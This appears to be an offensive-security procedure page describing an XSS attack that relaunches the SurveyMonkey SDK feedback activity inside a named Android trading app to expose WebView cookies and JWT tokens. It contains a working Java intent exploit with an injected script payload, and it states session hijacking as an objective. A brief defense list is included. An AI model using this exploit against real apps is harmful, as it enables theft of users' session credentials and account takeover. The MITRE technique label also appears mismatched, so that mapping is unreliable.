---
tags:
  - xss
  - android
  - injection
type: procedure
tools:
  - '[[tools/SurveyMonkey-Android-SDK]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/xss-payload-intent]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1416]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:31.928Z'
sub_techniques: []
id: 431dcd8c-fa8e-4168-9b96-3841ed7f3df4
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[T1416]]'
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-for-Cookie-Theft

## Summary

This procedure relaunches the SMFeedbackActivity with a malicious JavaScript payload to execute XSS and expose document.cookie in the WebView.

## Description

The payload uses <script>document.write(document.cookie)</script> loaded via smSPageHTML into loadDataWithBaseURL with baseURL https://my.exness.asia/r/, exploiting shared cookie storage to access JWT tokens and credentials from all app WebViews.

## Requirements

1. Initial payload executed and site loaded
2. 20-second delay elapsed
3. WebView JavaScript enabled

## Defense

Defensive measures and detection strategies:

- Sanitize and escape Intent Extras before WebView load
- Use separate cookie managers per WebView
- Disable JS or add CSP to WebViews

## Objectives

1. Execute arbitrary JavaScript in target context
2. Access shared cookies for exfiltration
3. Enable session hijacking

## Instructions

### Step 1: Prepare Malicious Intent

**Context**: Construct intent with XSS payload after delay.

In the attacker app code, set up the delayed runnable.

> Expected output: Intent ready with extras.

### Step 2: Launch XSS Intent

**Context**: Start activity to inject and run the script.

Execute [[commands/xss-payload-intent]]:

```java
final Intent intent2 = new Intent("android.intent.action.VIEW"); intent2.putExtra("smSPageHTML","<h1>Exploited</h1><script>document.write(document.cookie)</script>"); intent2.putExtra("smSPageURL","https://my.exness.asia/r/"); intent2.setClassName(createPackageContext("com.exness.investments",Context.CONTEXT_IGNORE_SECURITY),"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity"); new Handler().postDelayed(new Runnable(){ @Override public void run(){ startActivity(intent2); } },20000);
```

> Explanation: Targets activity, loads payload. Expected output: Cookies written to WebView.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[T1416]] Cross-site Scripting (XSS)
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/xss-payload-intent]]

## Tools Used

- [[tools/SurveyMonkey-Android-SDK]]

## Tags

- xss
- android
- injection
